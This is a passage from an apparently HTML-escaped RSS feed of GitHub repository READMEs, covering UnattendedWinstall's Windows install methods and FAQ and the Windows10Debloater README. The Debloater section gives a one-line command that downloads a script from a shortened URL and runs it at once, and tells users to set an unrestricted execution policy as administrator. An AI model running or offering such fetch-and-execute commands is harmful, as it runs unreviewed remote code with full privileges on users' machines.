 &lt;li&gt;&lt;strong&gt;Boot from the USB flash drive, choose your ISO &amp;amp; Install Windows&lt;/strong&gt;&lt;/li&gt; 
&lt;/ol&gt; 
&lt;p&gt;For more info, check out the official &lt;a href=&quot;https://github.com/memstechtips/WIMUtil&quot;&gt;WIMUtil&lt;/a&gt; GitHub Repo.&lt;/p&gt; 
&lt;hr&gt; 
&lt;h3&gt;Old Methods&lt;/h3&gt; 
&lt;h4&gt;Method 1: Create a Bootable Windows Installation USB&lt;/h4&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href=&quot;https://youtu.be/pDEZDD_gEbo&quot;&gt;Video Tutorial&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;details&gt; 
 &lt;summary&gt;Click to Show Instructions&lt;/summary&gt; 
 &lt;ol&gt; 
  &lt;li&gt; &lt;p&gt;Download the &lt;code&gt;autounattend.xml&lt;/code&gt; file and save it on your computer.&lt;/p&gt; &lt;/li&gt; 
  &lt;li&gt; &lt;p&gt;Create a &lt;a href=&quot;https://www.microsoft.com/en-us/software-download/windows10&quot;&gt;Windows 10&lt;/a&gt; or &lt;a href=&quot;https://www.microsoft.com/en-us/software-download/windows11&quot;&gt;Windows 11&lt;/a&gt; Bootable Installation USB drive with &lt;a href=&quot;https://rufus.ie/en/&quot;&gt;Rufus&lt;/a&gt; or the Media Creation Tool.&lt;/p&gt; 
   &lt;blockquote&gt; 
    &lt;p&gt;&lt;strong&gt;Important&lt;/strong&gt;&lt;/p&gt; 
    &lt;ul&gt; 
     &lt;li&gt;Some users have reported issues with the Media Creation Tool when creating the Windows Installation USB. Use it at your own discretion.&lt;/li&gt; 
     &lt;li&gt;When using Rufus, don’t select any of the checkboxes in “Customize Your Windows Experience,” as it creates another &lt;code&gt;autounattend.xml&lt;/code&gt; file that might overwrite settings in the UnattendedWinstall file.&lt;/li&gt; 
    &lt;/ul&gt; 
   &lt;/blockquote&gt; &lt;/li&gt; 
  &lt;li&gt; &lt;p&gt;Copy the &lt;code&gt;autounattend.xml&lt;/code&gt; file you downloaded in Step 1 to the root of the Bootable Windows Installation USB you created in Step 2.&lt;/p&gt; &lt;/li&gt; 
  &lt;li&gt; &lt;p&gt;Boot from the Windows Installation USB, do a clean install of Windows as normal, and the scripts will run automatically.&lt;/p&gt; &lt;/li&gt; 
 &lt;/ol&gt; 
&lt;/details&gt; 
&lt;h4&gt;Method 2: Create a Custom ISO File&lt;/h4&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href=&quot;https://youtu.be/pDEZDD_gEbo?si=ChEGghEOLCyLSnp7&amp;amp;t=1117&quot;&gt;Video Tutorial&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;details&gt; 
 &lt;summary&gt;Click to Show Instructions&lt;/summary&gt; 
 &lt;ol&gt; 
  &lt;li&gt;Download the &lt;code&gt;autounattend.xml&lt;/code&gt; file and save it on your computer.&lt;/li&gt; 
  &lt;li&gt;Download the &lt;a href=&quot;https://www.microsoft.com/en-us/software-download/windows10&quot;&gt;Windows 10&lt;/a&gt; or &lt;a href=&quot;https://www.microsoft.com/en-us/software-download/windows11&quot;&gt;Windows 11&lt;/a&gt; ISO file depending on the version you want.&lt;/li&gt; 
  &lt;li&gt;Download and install &lt;a href=&quot;https://anyburn.com/download.php&quot;&gt;AnyBurn&lt;/a&gt; 
   &lt;ul&gt; 
    &lt;li&gt;In AnyBurn, select the “Edit Image File” option.&lt;/li&gt; 
    &lt;li&gt;Navigate to and select the Official Windows ISO file you downloaded in Step 2.&lt;/li&gt; 
    &lt;li&gt;Click on “Add” and select the &lt;code&gt;autounattend.xml&lt;/code&gt; file you downloaded in Step 1, or just click and drag the &lt;code&gt;autounattend.xml&lt;/code&gt; into the AnyBurn window.&lt;/li&gt; 
    &lt;li&gt;Click on “Next,” then on “Create Now.” You should be prompted to overwrite the ISO file; click on “Yes.”&lt;/li&gt; 
    &lt;li&gt;Once the process is complete, close AnyBurn.&lt;/li&gt; 
   &lt;/ul&gt; &lt;/li&gt; 
  &lt;li&gt;Use the ISO file to install Windows on a Virtual Machine OR use a program like &lt;a href=&quot;https://rufus.ie/en/&quot;&gt;Rufus&lt;/a&gt; or &lt;a href=&quot;https://github.com/ventoy/Ventoy&quot;&gt;Ventoy&lt;/a&gt; to create a bootable USB flash drive with the edited Windows ISO file.&lt;/li&gt; 
 &lt;/ol&gt; 
 &lt;blockquote&gt; 
  &lt;p&gt;&lt;strong&gt;Important&lt;/strong&gt;&lt;/p&gt; 
  &lt;ul&gt; 
   &lt;li&gt;When using Rufus, don’t select any of the checkboxes in “Customize Your Windows Experience,” as it creates another &lt;code&gt;autounattend.xml&lt;/code&gt; file that might overwrite settings in the UnattendedWinstall file.&lt;/li&gt; 
  &lt;/ul&gt; 
 &lt;/blockquote&gt; 
 &lt;ol start=&quot;5&quot;&gt; 
  &lt;li&gt;Boot from the Windows Installation USB, do a clean install of Windows as normal, and the scripts will run automatically.&lt;/li&gt; 
 &lt;/ol&gt; 
&lt;/details&gt; 
&lt;h4&gt;Method 3: Use Ventoy Auto Install Plugin&lt;/h4&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href=&quot;https://youtu.be/4AGZQJTyCOs&quot;&gt;Video Tutorial&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;details&gt; 
 &lt;summary&gt;Click to Show Instructions&lt;/summary&gt; 
 &lt;ol&gt; 
  &lt;li&gt;Download the &lt;code&gt;autounattend.xml&lt;/code&gt; file and save it on your computer.&lt;/li&gt; 
  &lt;li&gt;Download the &lt;a href=&quot;https://www.microsoft.com/en-us/software-download/windows10&quot;&gt;Windows 10&lt;/a&gt; or &lt;a href=&quot;https://www.microsoft.com/en-us/software-download/windows11&quot;&gt;Windows 11&lt;/a&gt; ISO file, depending on the version you want.&lt;/li&gt; 
  &lt;li&gt;Download and install &lt;a href=&quot;https://github.com/ventoy/Ventoy&quot;&gt;Ventoy&lt;/a&gt; to your desired USB flash drive.&lt;/li&gt; 
  &lt;li&gt;Prepare the folder structure: 
   &lt;ul&gt; 
    &lt;li&gt;In your newly created Ventoy USB disk, create the following folders: &lt;code&gt;ISO&lt;/code&gt; and &lt;code&gt;Templates&lt;/code&gt;. &lt;br&gt; &lt;em&gt;They should be at the root of the drive.&lt;/em&gt;&lt;/li&gt; 
    &lt;li&gt;Inside of the &lt;code&gt;ISO&lt;/code&gt; folder, create a new folder called &lt;code&gt;Windows&lt;/code&gt;.&lt;/li&gt; 
    &lt;li&gt;Copy your Windows ISO files in the &lt;code&gt;ISO\Windows&lt;/code&gt; folder.&lt;/li&gt; 
    &lt;li&gt;Copy your &lt;code&gt;autounattend.xml&lt;/code&gt; into the &lt;code&gt;Templates&lt;/code&gt; folder.&lt;/li&gt; 
   &lt;/ul&gt; &lt;/li&gt; 
  &lt;li&gt;Start VentoyPlugson. Depending on your OS, the steps might differ. 
   &lt;ul&gt; 
    &lt;li&gt;On Windows, run the &lt;code&gt;VentoyPlugson.exe&lt;/code&gt; file.&lt;/li&gt; 
    &lt;li&gt;A new browser window should open up with a Ventoy web interface ready to go.&lt;/li&gt; 
    &lt;li&gt;Select the &lt;code&gt;Auto Install Plugin&lt;/code&gt; menu from the list.&lt;/li&gt; 
    &lt;li&gt;Click on the &lt;code&gt;Add&lt;/code&gt; button.&lt;/li&gt; 
    &lt;li&gt;Select [parent] to make the whole Windows ISO folder benefit from the plugin.&lt;/li&gt; 
    &lt;li&gt;In the Directory Path, paste in the absolute path to your &lt;code&gt;Windows&lt;/code&gt; folder. &lt;br&gt; example: &lt;code&gt;F:\ISO\Windows&lt;/code&gt; (Replace &lt;code&gt;F&lt;/code&gt; with your drive letter.)&lt;/li&gt; 
    &lt;li&gt;In the Template Path, paste in the absolute path to your &lt;code&gt;autounattend.xml&lt;/code&gt; file. &lt;br&gt; example: &lt;code&gt;F:\Templates\autounattend.xml&lt;/code&gt; (Replace &lt;code&gt;F&lt;/code&gt; with your drive letter.) &lt;br&gt; (PSA: If you have more &lt;code&gt;autounattend.xml&lt;/code&gt; files, you can add them later on!)&lt;/li&gt; 
    &lt;li&gt;Click on &lt;code&gt;OK&lt;/code&gt; and you should see a message saying that the configuration has been saved successfully.&lt;/li&gt; 
    &lt;li&gt;Close the VentoyPlugson browser window and stop the VentoyPlugson application.&lt;/li&gt; 
   &lt;/ul&gt; &lt;/li&gt; 
  &lt;li&gt;Boot from the Ventoy USB drive in the computer where you want to install windows. 
   &lt;ul&gt; 
    &lt;li&gt;After selecting a Windows ISO to boot from, you will be prompted to boot with the &lt;code&gt;/Templates/autounattend.xml&lt;/code&gt; file.&lt;/li&gt; 
    &lt;li&gt;Select that option and the &lt;code&gt;autounattend.xml&lt;/code&gt; will be automatically executed during installation.&lt;/li&gt; 
   &lt;/ul&gt; &lt;/li&gt; 
 &lt;/ol&gt; 
&lt;/details&gt; 
&lt;h2&gt;FAQ&lt;/h2&gt; 
&lt;h3&gt;How can I apply these settings to an existing Windows installation?&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;Run the &lt;a href=&quot;https://github.com/memstechtips/UnattendedWinstall/raw/main/UWScript.ps1&quot;&gt;&lt;code&gt;UWScript.ps1&lt;/code&gt;&lt;/a&gt; file or use the &lt;a href=&quot;https://github.com/ChrisTitusTech/winutil&quot;&gt;Chris Titus Tech Windows Utility&lt;/a&gt; (&lt;a href=&quot;https://youtu.be/pldFPTnOCGM&quot;&gt;Video&lt;/a&gt;).&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;Can this answer file be used for an in-place upgrade?&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;No, in-place upgrades do not support answer files.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;Why is Windows still updating automatically?&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;Feature updates are delayed for a year; however, security and driver updates continue as usual.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;Why don&#39;t I have internet after installing Windows?&lt;/h3&gt; 
&lt;details&gt; 
 &lt;summary&gt;Click to Show Instructions&lt;/summary&gt; 
 &lt;p&gt;If you’re unable to connect to the internet after installation, it’s likely because your Wi-Fi or LAN (Ethernet) drivers are missing. Windows sometimes doesn’t include all necessary drivers for network adapters, especially if they’re specific to your device.&lt;/p&gt; 
 &lt;p&gt;To resolve this, follow these steps:&lt;/p&gt; 
 &lt;ol&gt; 
  &lt;li&gt;&lt;strong&gt;Download your network driver&lt;/strong&gt; from the manufacturer’s website on another computer with internet access. Look for Wi-Fi or LAN drivers specific to your device model.&lt;/li&gt; 
  &lt;li&gt;&lt;strong&gt;Transfer the driver&lt;/strong&gt; to your Windows installation via USB drive.&lt;/li&gt; 
  &lt;li&gt;&lt;strong&gt;Install the driver&lt;/strong&gt; on your Windows system and restart if necessary.&lt;/li&gt; 
 &lt;/ol&gt; 
 &lt;p&gt;After installation, you should be able to connect to the internet.&lt;/p&gt; 
&lt;/details&gt; 
&lt;h3&gt;How can I access the previous &quot;IoT-LTSC-Like,&quot; &quot;Standard,&quot; and &quot;Core&quot; versions of the file(s)?&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;You still have access to the previous files here: &lt;a href=&quot;https://github.com/memstechtips/UnattendedWinstall/releases/tag/v1.0.0&quot;&gt;Version 1.0.0 Release&lt;/a&gt;.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;[!NOTE]&lt;br&gt; You need to download the &lt;code&gt;Source Code.zip&lt;/code&gt; file. Once extracted, you’ll have access to all the previous v1.0.0 files.&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;h3&gt;Why isn&#39;t Microsoft Edge Uninstalled?&lt;/h3&gt; 
&lt;details&gt; 
 &lt;summary&gt;Click to Show Explanation&lt;/summary&gt; 
 &lt;p&gt;I spent a lot of time trying to find a way to uninstall Microsoft Edge during Windows installation. However, it was challenging because of differences between Windows 10 22H2 and Windows 11 24H2. My goal is to use Microsoft’s supported uninstall methods, and I plan to add an easy Edge removal option in future releases.&lt;/p&gt; 
 &lt;p&gt;In the meantime, if you wish to remove Edge after Windows installation, consider using &lt;a href=&quot;https://github.com/FR33THYFR33THY/Ultimate-Windows-Optimization-Guide/raw/main/6%20Windows/14%20Edge.ps1&quot;&gt;this script by FR33THY&lt;/a&gt;. FR33THY’s &lt;em&gt;Ultimate Windows Optimization Guide&lt;/em&gt; was a major inspiration for version 2.0.0 of this project, and I highly recommend exploring it for additional Windows optimization tips.&lt;/p&gt; 
&lt;/details&gt; 
&lt;h3&gt;How can I add my own Registry Tweaks to v2.0.0 of the &lt;code&gt;autounattend.xml&lt;/code&gt; file?&lt;/h3&gt; 
&lt;details&gt; 
 &lt;summary&gt;Click to Show Instructions&lt;/summary&gt; 
 &lt;p&gt;You can also still add your own registry entries to the v2.0.0 file, and it is actually easier if you understand where to add it. I&#39;ll give a brief explanation.&lt;/p&gt; 
 &lt;p&gt;For registry entries that apply to the local machine, i.e., &lt;code&gt;HKEY_LOCAL_MACHINE&lt;/code&gt; registry keys, you can find the &lt;code&gt;function SetRecommendedHKLMRegistry&lt;/code&gt; in the &lt;code&gt;autounattend.xml&lt;/code&gt; file, see here: &lt;a href=&quot;https://github.com/memstechtips/UnattendedWinstall/raw/93305192ed6d64e0f5b98a89f447927480285354/autounattend.xml#L1981&quot;&gt;https://github.com/memstechtips/UnattendedWinstall/blob/93305192ed6d64e0f5b98a89f447927480285354/autounattend.xml#L1981&lt;/a&gt;&lt;/p&gt; 
 &lt;p&gt;and then add whatever registry entries you want to add in &lt;code&gt;.reg&lt;/code&gt; format, like the rest of the entries are set, and just make sure you add it before the &lt;code&gt;&quot;@&lt;/code&gt; to make it part of the &lt;code&gt;.reg&lt;/code&gt; file that will be generated, see here: &lt;a href=&quot;https://github.com/memstechtips/UnattendedWinstall/raw/93305192ed6d64e0f5b98a89f447927480285354/autounattend.xml#L3412&quot;&gt;https://github.com/memstechtips/UnattendedWinstall/blob/93305192ed6d64e0f5b98a89f447927480285354/autounattend.xml#L3412&lt;/a&gt;&lt;/p&gt; 
 &lt;p&gt;and it will then be applied to the registry.&lt;/p&gt; 
 &lt;p&gt;Similarly, if you have &lt;code&gt;HKEY_CURRENT_USER&lt;/code&gt; registry keys, you can add those to the &lt;code&gt;User Customization.ps1&lt;/code&gt; file in the same way as explained above, starting here: &lt;a href=&quot;https://github.com/memstechtips/UnattendedWinstall/raw/93305192ed6d64e0f5b98a89f447927480285354/autounattend.xml#L3912&quot;&gt;https://github.com/memstechtips/UnattendedWinstall/blob/93305192ed6d64e0f5b98a89f447927480285354/autounattend.xml#L3912&lt;/a&gt; so below the &lt;code&gt;Windows Registry Editor Version 5.00&lt;/code&gt; and then ending before the &lt;code&gt;&quot;@&lt;/code&gt; here: &lt;a href=&quot;https://github.com/memstechtips/UnattendedWinstall/raw/93305192ed6d64e0f5b98a89f447927480285354/autounattend.xml#L4423&quot;&gt;https://github.com/memstechtips/UnattendedWinstall/blob/93305192ed6d64e0f5b98a89f447927480285354/autounattend.xml#L4423&lt;/a&gt;&lt;/p&gt; 
 &lt;blockquote&gt; 
  &lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt;&lt;br&gt; The above links might not take you to the correct lines of code once new versions of the file are released, but it does take you to the correct lines on v2.0.0.&lt;/p&gt; 
 &lt;/blockquote&gt; 
&lt;/details&gt;</description>
    </item>
    
    <item>
      <title>Sycnex/Windows10Debloater</title>
      <link>https://github.com/Sycnex/Windows10Debloater</link>
      <description>&lt;p&gt;Script to remove Windows 10 bloatware.&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Windows10Debloater&lt;/h1&gt; 
&lt;p&gt;&lt;a href=&quot;https://microsoft.com/PowerShell&quot;&gt;&lt;img src=&quot;https://img.shields.io/badge/PowerShell-1f425f?logo=Powershell&quot; alt=&quot;made-with-powershell&quot;&gt;&lt;/a&gt; &lt;a href=&quot;https://opensource.org/licenses/MIT&quot;&gt;&lt;img src=&quot;https://img.shields.io/badge/License-MIT-yellow.svg?sanitize=true&quot; alt=&quot;License: MIT&quot;&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Script/Utility/Application to debloat Windows 10, to remove Windows pre-installed unnecessary applications, stop some telemetry functions, stop Cortana from being used as your Search Index, disable unnecessary scheduled tasks, and more...&lt;/p&gt; 
&lt;h2&gt;Donate a cup of coffee&lt;/h2&gt; 
&lt;p&gt;&lt;a href=&quot;https://www.buymeacoffee.com/HZNh7w1Bm&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png&quot; alt=&quot;Buy Me A Coffee&quot; style=&quot;height: 41px !important;width: 174px !important;box-shadow: 0px 3px 2px 0px rgba(190, 190, 190, 0.5) !important;-webkit-box-shadow: 0px 3px 2px 0px rgba(190, 190, 190, 0.5) !important;&quot;&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Be sure to look at the Contributors&#39; GitHubs to see if they have GitHub sponsorships as well since they have contributed to this open-source project. (&lt;a href=&quot;https://github.com/Sycnex/Windows10Debloater/graphs/contributors&quot;&gt;https://github.com/Sycnex/Windows10Debloater/graphs/contributors&lt;/a&gt;)&lt;/p&gt; 
&lt;h2&gt;Disclaimer&lt;/h2&gt; 
&lt;p&gt;&lt;strong&gt;WARNING:&lt;/strong&gt; I do &lt;strong&gt;NOT&lt;/strong&gt; take responsibility for what may happen to your system! Run scripts at your own risk! Also, other variants of this repo are not technically &quot;new&quot; versions of this, but they are different in their own respective ways. There are some sites saying that other projects are &quot;new&quot; versions of this, but that is inaccurate.&lt;/p&gt; 
&lt;h2&gt;How To Run the Windows10Debloater.ps1 and the Windows10DebloaterGUI.ps1 files&lt;/h2&gt; 
&lt;p&gt;There are different methods of running the PowerShell script. The methods are as follows:&lt;/p&gt; 
&lt;h3&gt;First Method&lt;/h3&gt; 
&lt;ol&gt; 
 &lt;li&gt;Download the .zip file on the main page of the GitHub and extract the .zip file to your desired location&lt;/li&gt; 
 &lt;li&gt;Once extracted, open &lt;a href=&quot;https://docs.microsoft.com/en-us/powershell/scripting/overview?view=powershell-5.1&quot;&gt;PowerShell&lt;/a&gt; (or &lt;a href=&quot;https://docs.microsoft.com/en-us/powershell/scripting/windows-powershell/ise/introducing-the-windows-powershell-ise?view=powershell-7&quot;&gt;PowerShell ISE&lt;/a&gt;) as an Administrator&lt;/li&gt; 
 &lt;li&gt;Enable PowerShell execution &lt;code&gt;Set-ExecutionPolicy Unrestricted -Force&lt;/code&gt;&lt;/li&gt; 
 &lt;li&gt;On the prompt, change to the directory where you extracted the files: &amp;nbsp; e.g. - &lt;code&gt;cd c:\temp&lt;/code&gt;&lt;/li&gt; 
 &lt;li&gt;Next, to run either script, enter in the following: &amp;nbsp; e.g. - &lt;code&gt;.\Windows10DebloaterGUI.ps1&lt;/code&gt;&lt;/li&gt; 
&lt;/ol&gt; 
&lt;h3&gt;Second Method&lt;/h3&gt; 
&lt;ol&gt; 
 &lt;li&gt;Download the .zip file on the main page of the GitHub and extract the .zip file to your desired location&lt;/li&gt; 
 &lt;li&gt;Right-click the PowerShell file that you&#39;d like to run and click on &quot;Run With PowerShell&quot;&lt;/li&gt; 
 &lt;li&gt;This will allow the script to run without having to do the above steps but Powershell will ask if you&#39;re sure you want to run this script.&lt;/li&gt; 
&lt;/ol&gt; 
&lt;p&gt;Remember this script &lt;strong&gt;NEEDS&lt;/strong&gt; to be run as admin in order to function properly.&lt;/p&gt; 
&lt;h2&gt;How To Run the Windows10SysPrepDebloater.ps1 file&lt;/h2&gt; 
&lt;p&gt;For the WindowsSysPrepDebloater.ps1 file, there are a couple of parameters that you can run so that you can specify which functions are used. The parameters are: &lt;code&gt;-SysPrep&lt;/code&gt;, &lt;code&gt;-Debloat&lt;/code&gt; and &lt;code&gt;-Privacy&lt;/code&gt;.&lt;/p&gt; 
&lt;p&gt;To run this with parameters, do the following:&lt;/p&gt; 
&lt;ol&gt; 
 &lt;li&gt;Download the .zip file on the main page of the GitHub and extract the .zip file to your desired location&lt;/li&gt; 
 &lt;li&gt;Once extracted, open &lt;a href=&quot;https://docs.microsoft.com/en-us/powershell/scripting/overview?view=powershell-5.1&quot;&gt;PowerShell&lt;/a&gt; (or &lt;a href=&quot;https://docs.microsoft.com/en-us/powershell/scripting/windows-powershell/ise/introducing-the-windows-powershell-ise?view=powershell-7&quot;&gt;PowerShell ISE&lt;/a&gt;) as an Administrator&lt;/li&gt; 
 &lt;li&gt;On the prompt, change to the directory where you extracted the files: &amp;nbsp; e.g. - &lt;code&gt;cd c:\temp&lt;/code&gt;&lt;/li&gt; 
 &lt;li&gt;Next, to run either script, enter in the following:&lt;/li&gt; 
&lt;/ol&gt; 
&lt;p&gt;e.g. - &lt;code&gt;.\Windows10SysPrepDebloater.ps1 -Sysprep -Debloat -Privacy&lt;/code&gt;&lt;/p&gt; 
&lt;h2&gt;Sysprep, Interactive, and GUI Application&lt;/h2&gt; 
&lt;p&gt;There are now 3 versions of &lt;strong&gt;Windows10Debloater&lt;/strong&gt; - There is an interactive version, a GUI app version, and a pure silent version.&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;&lt;code&gt;Windows10SysPrepDebloater.ps1&lt;/code&gt;&lt;/strong&gt; -&amp;gt; The silent version now utilizes the switch parameters: -Sysprep, -Debloat -Privacy. The silent version can be useful for deploying MDT Images/sysprepping or any other way you deploy Windows 10. This will work to remove the bloatware during the deployment process.&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;&lt;code&gt;Windows10Debloater.ps1&lt;/code&gt;&lt;/strong&gt; -&amp;gt; This interactive version is what it implies - a Windows10Debloater script with interactive prompts. This one should not be used for deployments that require a silent script with optional parameters. This script gives you choices with prompts as it runs so that you can make the choices of what the script does.&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;&lt;code&gt;Windows10DebloaterGUI.ps1&lt;/code&gt;&lt;/strong&gt; -&amp;gt; There is now a GUI Application named Windows10DebloaterGUI.ps1 with buttons to perform all of the functions that the scripts do. This is better for the average user who does not want to work with code, or if you&#39;d prefer to just see an application screen.&lt;/p&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Switch Parameters&lt;/h2&gt; 
&lt;p&gt;There are 3 switch parameters in the &lt;code&gt;Windows10SysPrepDebloater.ps1&lt;/code&gt; script.&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;&lt;code&gt;-SysPrep&lt;/code&gt;&lt;/strong&gt;, which runs the command within a function: get-appxpackage | remove-appxpackage. This is useful since some administrators need that command to run first in order for machines to be able to properly provision the apps for removal.&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;&lt;code&gt;-Debloat&lt;/code&gt;&lt;/strong&gt;, switch parameter which does as it suggests. It runs the following functions: Start-Debloat, Remove-Keys, and Protect-Privacy. Remove-Keys removes registry keys leftover that are associated with the bloatware apps listed above, but not removed during the Start-Debloat function.&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;&lt;code&gt;-Privacy&lt;/code&gt;&lt;/strong&gt;, adds and/or changes registry keys to stop some telemetry functions, stops Cortana from being used as your Search Index, disables &quot;unnecessary&quot; scheduled tasks, and more.&lt;/p&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;&lt;em&gt;&lt;strong&gt;This script will remove the bloatware from Windows 10 when using Remove-AppXPackage/Remove-AppXProvisionedPackage, and then delete specific registry keys that are were not removed beforehand. For best results, this script should be run before a user profile is configured, otherwise, you will likely see that apps that should have been removed will remain, and if they are removed you will find broken tiles on the start menu.&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt; 
&lt;h2&gt;These registry keys are&lt;/h2&gt; 
&lt;p&gt;EclipseManager, ActiproSoftwareLLC, Microsoft.PPIProjection, Microsoft.XboxGameCallableUI&lt;/p&gt; 
&lt;p&gt;You can choose to either &#39;Debloat&#39; or &#39;Revert&#39;. Depending on your choice, either one will run specific code to either debloat your Windows 10 machine.&lt;/p&gt; 
&lt;h2&gt;The Debloat switch choice runs the following functions&lt;/h2&gt; 
&lt;p&gt;Debloat, Remove-Keys, Protect-Privacy, Stop-EdgePDF (If chosen)&lt;/p&gt; 
&lt;h2&gt;The Revert switch choice runs the following functions&lt;/h2&gt; 
&lt;p&gt;Revert-Changes, Enable-EdgePDF&lt;/p&gt; 
&lt;p&gt;The Revert option reinstalls the bloatware and changes your registry keys back to default.&lt;/p&gt; 
&lt;h2&gt;The scheduled tasks that are disabled are&lt;/h2&gt; 
&lt;p&gt;XblGameSaveTaskLogon, XblGameSaveTask, Consolidator, UsbCeip, DmClient&lt;/p&gt; 
&lt;p&gt;These scheduled tasks that are disabled have absolutely no impact on the function of the OS.&lt;/p&gt; 
&lt;h2&gt;Bloatware that is removed&lt;/h2&gt; 
&lt;p&gt;&lt;a href=&quot;https://www.microsoft.com/en-us/p/3d-builder/9wzdncrfj3t6&quot;&gt;3DBuilder&lt;/a&gt;, &lt;a href=&quot;https://www.microsoft.com/en-us/p/actipro-universal-windows-controls/9wzdncrdlvzp&quot;&gt;ActiproSoftware&lt;/a&gt;, &lt;a href=&quot;https://www.microsoft.com/en-us/p/windows-alarms-clock/9wzdncrfj3pr?activetab=pivot:overviewtab&quot;&gt;Alarms&lt;/a&gt;, &lt;a href=&quot;https://www.microsoft.com/en-us/p/connector/9wzdncrdjmlj?activetab=pivot:overviewtab&quot;&gt;Appconnector&lt;/a&gt;, &lt;a href=&quot;https://www.microsoft.com/en-us/p/asphalt-8-racing-game-drive-drift-at-real-speed/9wzdncrfj26j?activetab=pivot:overviewtab&quot;&gt;Asphalt8&lt;/a&gt;, &lt;a href=&quot;https://www.microsoft.com/en-us/p/autodesk-sketchbook/9nblggh4vzw5&quot;&gt;Autodesk SketchBook&lt;/a&gt;, &lt;a href=&quot;https://www.microsoft.com/en-us/p/msn-money/9wzdncrfhv4v?activetab=pivot:overviewtab&quot;&gt;MSN Money&lt;/a&gt;, &lt;a href=&quot;https://www.microsoft.com/en-us/p/food-and-drink/9nblggh0jhqg&quot;&gt;Food And Drink&lt;/a&gt;, &lt;a href=&quot;https://www.microsoft.com/en-us/p/health-fitness-free/9wzdncrcwcdp&quot;&gt;Health And Fitness&lt;/a&gt;, &lt;a href=&quot;https://www.microsoft.com/en-us/p/microsoft-news/9wzdncrfhvfw#activetab=pivot:overviewtab&quot;&gt;Microsoft News&lt;/a&gt;, &lt;a href=&quot;https://www.microsoft.com/en-us/p/msn-sports/9wzdncrfhvh4?activetab=pivot:overviewtab&quot;&gt;MSN Sports&lt;/a&gt;, &lt;a href=&quot;https://www.microsoft.com/en-us/p/msn-travel/9wzdncrfj3ft?activetab=pivot:overviewtab&quot;&gt;MSN Travel&lt;/a&gt;, &lt;a href=&quot;https://www.microsoft.com/en-us/p/msn-weather/9wzdncrfj3q2?activetab=pivot:overviewtab&quot;&gt;MSN Weather&lt;/a&gt;, BioEnrollment, &lt;a href=&quot;https://www.microsoft.com/en-us/p/windows-camera/9wzdncrfjbbg#activetab=pivot:overviewtab&quot;&gt;Windows Camera&lt;/a&gt;, CandyCrush, CandyCrushSoda, Caesars Slots Free Casino, ContactSupport, CyberLink MediaSuite Essentials, DrawboardPDF, Duolingo, EclipseManager, Facebook, FarmVille 2 Country Escape, Flipboard, Fresh Paint, Get started, iHeartRadio, King apps, Maps, March of Empires, Messaging, Microsoft Office Hub, Microsoft Solitaire Collection, Microsoft Sticky Notes, Minecraft, Netflix, Network Speed Test, NYT Crossword, Office Sway, OneNote, OneConnect, Pandora, People, Phone, Phototastic Collage, PicsArt-PhotoStudio, PowerBI, Royal Revolt 2, Shazam, Skype for Desktop, SoundRecorder, TuneInRadio, Twitter, Windows communications apps, Windows Feedback, Windows Feedback Hub, Windows Reading List, XboxApp, Xbox Game CallableUI, Xbox Identity Provider, Zune Music, Zune Video.&lt;/p&gt; 
&lt;h2&gt;Quick download link&lt;/h2&gt; 
&lt;p&gt;&lt;code&gt;iwr -useb https://git.io/debloat|iex&lt;/code&gt;&lt;/p&gt; 
&lt;h2&gt;Allowlist and Blocklist&lt;/h2&gt; 
&lt;p&gt;There may be some confusion, but when using the Allowlist/Blocklist, the checkmark means it is on the blocklist, and that it will be removed.&lt;/p&gt; 
&lt;h2&gt;Credits&lt;/h2&gt; 
&lt;p&gt;Thank you to &lt;a href=&quot;https://github.com/a60wattfish&quot;&gt;a60wattfish&lt;/a&gt;, &lt;a href=&quot;https://raw.githubusercontent.com/Sycnex/Windows10Debloater/master/abulgatz&quot;&gt;abulgatz&lt;/a&gt;, &lt;a href=&quot;https://github.com/xsisbest&quot;&gt;xsisbest&lt;/a&gt;, &lt;a href=&quot;https://github.com/Damian&quot;&gt;Damian&lt;/a&gt;, &lt;a href=&quot;https://github.com/Vikingat-RAGE&quot;&gt;Vikingat-RAGE&lt;/a&gt;, Reddit user &lt;a href=&quot;https://github.com/GavinEke&quot;&gt;/u/GavinEke&lt;/a&gt;, and all of the contributors (&lt;a href=&quot;https://github.com/Sycnex/Windows10Debloater/graphs/contributors&quot;&gt;https://github.com/Sycnex/Windows10Debloater/graphs/contributors&lt;/a&gt;) for the suggestions, code, changes, and fixes that you have all graciously worked hard on and shared! You all have done a fantastic job!&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>mandiant/flare-vm</title>
      <link>https://github.com/mandiant/flare-vm</link>
